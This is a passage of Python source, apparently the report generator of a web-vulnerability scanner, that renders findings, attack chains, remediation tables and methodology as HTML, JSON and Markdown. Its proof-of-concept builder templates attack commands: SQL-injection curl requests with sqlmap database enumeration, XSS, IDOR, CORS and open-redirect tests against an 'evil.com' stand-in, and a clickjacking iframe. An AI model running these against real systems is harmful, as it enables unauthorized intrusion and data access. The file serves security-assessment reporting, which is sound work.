    <span style="color:#cbd5e1;font-size:13px;">{b2}</span>
  </div>
  <div class="impact-item" style="grid-column:1/3;">
    <label style="color:#f87171;">⚠ {a3}</label>
    <span style="color:#cbd5e1;font-size:13px;">{b3}</span>
  </div>
</div>"""

    def _build_curl_poc(self, f: dict) -> str:
        url     = f.get("url","")
        param   = f.get("parameter","")
        payload = str(f.get("payload",""))
        module  = f.get("module","")

        if not url:
            return ""

        if module == "sqli":
            return (f'# Test for SQL injection\n'
                    f'curl -sk "{url}?{param}={payload}" \\\n'
                    f'  -H "User-Agent: Mozilla/5.0"\n\n'
                    f'# Confirm with SQLMap\n'
                    f'sqlmap -u "{url}" -p "{param}" --batch --dbs --level=2')
        elif module == "xss":
            safe_p = payload.replace('"', '\\"')
            return f'curl -sk "{url}?{param}={safe_p}" | grep -o "{payload[:20]}.*"'
        elif module == "cors":
            return (f'curl -sk "{url}" \\\n'
                    f'  -H "Origin: https://evil.com" \\\n'
                    f'  -H "Cookie: session=VICTIM_TOKEN" \\\n'
                    f'  -I | grep -i "access-control"')
        elif module == "idor":
            return (f'# Request as User A (your session)\n'
                    f'curl -sk "{url}" -H "Cookie: session=USER_A_TOKEN"\n\n'
                    f'# Modify ID — gets User B data\n'
                    f'curl -sk "{url.rstrip("/0123456789")}/{payload}" '
                    f'-H "Cookie: session=USER_A_TOKEN"')
        elif module == "open_redirect":
            return f'curl -sk -I "{url}?{param}=https://evil.com" | grep Location'
        elif module == "headers":
            return f'curl -sk -I "{url}" | grep -i "security\\|content-security\\|x-frame\\|strict-transport"'
        elif module == "clickjacking":
            return (f'# PoC iframe — save as poc.html and open in browser\n'
                    f'<iframe src="{url}" width="800" height="600"></iframe>')
        else:
            return f'curl -sk "{url}"'

    def _chains_section(self) -> str:
        if not self.chains:
            return ""
        cards = ""
        for chain in self.chains:
            steps = chain.get("steps",[])
            step_html = ""
            for j, s in enumerate(steps):
                step_html += f'<span class="chain-step">{s}</span>'
                if j < len(steps)-1:
                    step_html += '<span class="chain-arrow">→</span>'
            exploit = chain.get("exploit_code","")
            exploit_html = ""
            if exploit:
                exploit_html = f'''<div class="code-block poc" style="margin-top:16px;">
  <div class="code-block-header"><span class="code-block-lang">python</span><span class="code-block-label">Exploit Chain Code</span></div>
  <pre>{exploit[:800]}</pre>
</div>'''
            cards += f'''<div class="chain-card">
  <div class="chain-header">
    <span class="chain-title">⛓ {chain.get("name","")}</span>
    {"<span class='chain-bounty'>Est. $" + str(chain.get("estimated_bounty",0)) + "</span>" if chain.get("estimated_bounty") else ""}
  </div>
  <div class="chain-body">
    <p style="color:#fca5a5;margin-bottom:16px;">{chain.get("impact","")}</p>
    <div class="chain-steps">{step_html}</div>
    {exploit_html}
  </div>
</div>'''

        return f'''<div class="section page-break" id="chains">
  <div class="section-label">03</div>
  <h2 class="section-title">Attack Chains</h2>
  <p class="section-intro">The following chains demonstrate how individual findings can be combined to achieve greater impact.</p>
  {cards}
</div>'''

    def _remediation_table(self, findings) -> str:
        rows = ""
        for i, f in enumerate(findings, 1):
            sev   = f.get("severity","INFO")
            color = SEV_HEX.get(sev,"#7F8C8D")
            prio  = ["CRITICAL","HIGH"].index(sev)+1 if sev in ["CRITICAL","HIGH"] else 3
            prio_cls = f"priority-{min(prio,3)}"
            effort = {"CRITICAL":"Low","HIGH":"Low","MEDIUM":"Medium","LOW":"Low","INFO":"Low"}.get(sev,"Medium")
            rem = f.get("remediation","")[:80]
            rows += f'''<tr>
  <td><a href="#finding-{i}" style="color:#60a5fa;text-decoration:none;">#{i}</a></td>
  <td style="color:{color};font-weight:600;font-size:11px;">{sev}</td>
  <td style="color:#e2e8f0;">{f.get("title","")[:50]}</td>
  <td class="{prio_cls}">P{prio}</td>
  <td style="color:#94a3b8;">{effort}</td>
  <td style="color:#94a3b8;font-size:12px;">{rem}{"..." if len(f.get("remediation",""))>80 else ""}</td>
</tr>'''

        return f'''<table class="remediation-table">
  <thead>
    <tr>
      <th>#</th><th>Severity</th><th>Finding</th>
      <th>Priority</th><th>Effort</th><th>Remediation</th>
    </tr>
  </thead>
  <tbody>{rows}</tbody>
</table>'''

    def _methodology(self) -> str:
        return '''<div class="method-grid">
  <div class="method-card">
    <h4>Reconnaissance</h4>
    <ul>
      <li>Subdomain enumeration (Subfinder)</li>
      <li>Certificate transparency (crt.sh)</li>
      <li>JS file analysis for secrets</li>
      <li>Wayback Machine historical URLs</li>
      <li>Port scanning and service detection</li>
    </ul>
  </div>
  <div class="method-card">
    <h4>Vulnerability Testing</h4>
    <ul>
      <li>51 automated attack modules</li>
      <li>Authenticated + unauthenticated scans</li>
      <li>Manual verification of all findings</li>
      <li>Session replay (Autorize technique)</li>
      <li>WAF bypass techniques applied</li>
    </ul>
  </div>
  <div class="method-card">
    <h4>Tools Used</h4>
    <ul>
      <li>AmonStrike v7.0 (primary scanner)</li>
      <li>SQLMap (SQLi confirmation)</li>
      <li>Dalfox (XSS verification)</li>
      <li>Nuclei (template scanning)</li>
      <li>ffuf (directory fuzzing)</li>
    </ul>
  </div>
  <div class="method-card">
    <h4>Standards</h4>
    <ul>
      <li>OWASP Top 10 (2021)</li>
      <li>OWASP API Security Top 10</li>
      <li>PTES Technical Guidelines</li>
      <li>CVSS 3.1 scoring</li>
      <li>HackerOne disclosure format</li>
    </ul>
  </div>
</div>'''

    # ── JSON ────────────────────────────────────────────────────
    def _json(self, findings: list) -> str:
        data = {
            "scan_id": self.scan_id, "target": self.target,
            "date": self.scan_date, "tester": self.tester_name,
            "summary": {s: sum(1 for f in findings if f.get("severity")==s) for s in SEV_ORDER},
            "findings": findings, "chains": self.chains,
        }
        path = self.output_dir / f"report_{self.scan_id}.json"
        path.write_text(json.dumps(data, indent=2, default=str))
        return str(path)

    # ── MARKDOWN ────────────────────────────────────────────────
    def _md(self, findings: list) -> str:
        lines = [
            f"# Security Assessment Report — {self.company}",
            f"**Target:** `{self.target}`  **Date:** {self.scan_date}  **Assessor:** {self.tester_name}",
            "", "---", "", "## Summary", "",
            "| Severity | Count |", "|---|---|",
        ]
        counts = {s: sum(1 for f in findings if f.get("severity")==s) for s in SEV_ORDER}
        for s,c in counts.items():
            if c: lines.append(f"| **{s}** | {c} |")
        lines += ["", "---", "", "## Findings", ""]
        for i, f in enumerate(findings, 1):
            curl = self._build_curl_poc(f)
            lines += [
                f"### #{i} [{f.get('severity','')}] {f.get('title','')}",
                f"**URL:** `{f.get('url','')}` | **Parameter:** `{f.get('parameter','')}` | **CWE:** {f.get('cve','')}",
                "", f.get("description",""), "",
                "**Evidence:**", f"```", f.get("evidence","")[:400], "```", "",
            ]
            if curl:
                lines += ["**PoC:**", f"```bash", curl, "```", ""]
            lines += [f"**Remediation:** {f.get('remediation','')}", "", "---", ""]
        path = self.output_dir / f"report_{self.scan_id}.md"
        path.write_text("\n".join(lines))
        return str(path)
